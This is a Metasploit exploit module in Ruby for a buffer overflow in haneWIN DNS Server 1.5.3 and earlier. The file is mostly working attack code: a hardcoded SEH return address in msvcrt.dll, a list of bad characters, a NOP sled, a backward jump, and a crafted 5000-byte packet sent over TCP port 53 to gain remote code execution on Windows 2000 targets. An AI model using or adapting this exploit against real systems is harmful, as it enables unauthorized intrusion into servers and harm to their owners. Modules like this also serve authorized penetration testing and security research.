 
class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;      => &#039;haneWIN DNS Server Buffer Overflow&#039;,
            &#039;Description&#039;   => %q{
                This module exploits a buffer overflow vulnerability found in
                haneWIN DNS Server <= 1.5.3. The vulnerability is triggered
                by sending an overly long packet to the victim server. A memcpy
                function blindly copies user supplied data to a fixed size buffer
                leading to remote code execution. 
 
                This module was tested against haneWIN DNS 1.5.3
            },
            &#039;Author&#039; => [ &#039;james fitts&#039; ],
            &#039;License&#039; => MSF_LICENSE,
            &#039;References&#039; =>
                [
                    [ &#039;EDB&#039;, &#039;31260&#039; ],
                    [ &#039;OSVDB&#039;, &#039;102773&#039; ]
                ],
            &#039;Privileged&#039;  => false,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039; => 1000,
                    &#039;DisableNops&#039; => true,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;DefaultTarget&#039; => 0,
            &#039;Targets&#039; =>
                [
                    [
                        &#039;Windows 2000 SP4 EN / haneWIN DNS 1.5.3&#039;,
                        {
                            # msvcrt.dll v6.10.9844.0
                            # pop esi/ pop edi/ retn
                            &#039;Ret&#039; => 0x78010394,
                        }
                    ]
                ],
            &#039;DisclosureDate&#039; => &#039;Jul 27 2013&#039;))
 
            register_options([Opt::RPORT(53)], self.class)
    end
 
    def exploit
        connect
 
        p = make_nops(32) + payload.encoded
 
        buf = Rex::Text.pattern_create(5000)
        buf[0, 2] = [0x4e20].pack(&#039;n&#039;)                          # length for malloc
        buf[1332, p.length] = p
        buf[2324, 8] = generate_seh_record(target.ret)
        buf[2332, 15] = make_nops(10) + "\xe9\x13\xfc\xff\xff"  # jmp $-1000 
 
        print_status("Sending malicious request...")
        sock.put(buf)
        disconnect
 
    end
end

